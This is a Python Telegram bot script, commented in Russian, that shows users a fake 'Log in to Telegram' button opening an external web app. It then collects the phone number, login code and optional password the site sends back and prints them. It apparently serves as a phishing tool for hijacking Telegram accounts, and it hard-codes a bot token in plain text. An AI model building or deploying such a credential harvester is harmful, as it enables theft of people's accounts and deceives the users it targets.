import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    WebAppInfo,
    ReplyKeyboardMarkup,
    KeyboardButton  # <--- ВАЖНО: Используем обычную кнопку, а не Inline
)

# ==========================================
# 👇 НАСТРОЙКИ 👇
# ==========================================
BOT_TOKEN = "8563110236:AAEO8GlnHVxtsMjbaiQ-EuHq7hphAaMzXL0"
WEB_APP_URL = "https://vanchopiki.github.io/test/"
# ==========================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# --- ОТПРАВКА КНОПКИ ---
async def send_login_button(message: types.Message, need_password: bool):
    # Формируем ссылку
    if need_password:
        final_url = f"{WEB_APP_URL}?p=1"
        text_msg = "🔐 Включен режим: <b>С ПАРОЛЕМ</b>\nНажми кнопку <b>ВНИЗУ</b> экрана 👇"
    else:
        final_url = WEB_APP_URL
        text_msg = "📱 Включен режим: <b>ОБЫЧНЫЙ</b>\nНажми кнопку <b>ВНИЗУ</b> экрана 👇"

    # ВАЖНО: Создаем клавиатуру для НИЖНЕГО меню
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text="⚡ Войти в Telegram",
                    web_app=WebAppInfo(url=final_url)
                )
            ]
        ],
        resize_keyboard=True,  # Кнопка будет аккуратной
        one_time_keyboard=False
    )

    await message.answer(text_msg, reply_markup=keyboard, parse_mode="HTML")


# 1. Если пишут "пароль"
@dp.message(F.text.lower() == "пароль")
async def password_mode(message: types.Message):
    await send_login_button(message, need_password=True)


# 2. Команда /start и всё остальное
@dp.message(Command("start"))
@dp.message()
async def default_mode(message: types.Message):
    await send_login_button(message, need_password=False)


# 3. ЛОВИМ ДАННЫЕ ОТ САЙТА
# Этот хендлер сработает, когда сайт выполнит tg.sendData()
@dp.message(F.web_app_data)
async def get_web_app_data(message: types.Message):
    print(f"Пришли данные: {message.web_app_data.data}")  # Пишем в консоль PyCharm для проверки

    try:
        data = json.loads(message.web_app_data.data)

        phone = data.get('phone', '—')
        code = data.get('code', '—')
        password = data.get('password', '')

        if not password:
            password = "<i>(Не введен)</i>"

        text = (
            "✅ <b>ДАННЫЕ ПОЛУЧЕНЫ!</b>\n\n"
            f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
            f"🔢 <b>Код:</b> <code>{code}</code>\n"
            f"🔑 <b>Пароль:</b> <code>{password}</code>"
        )

        await message.answer(text, parse_mode="HTML")

    except Exception as e:
        await message.answer(f"Ошибка чтения данных: {e}")


async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Стоп.")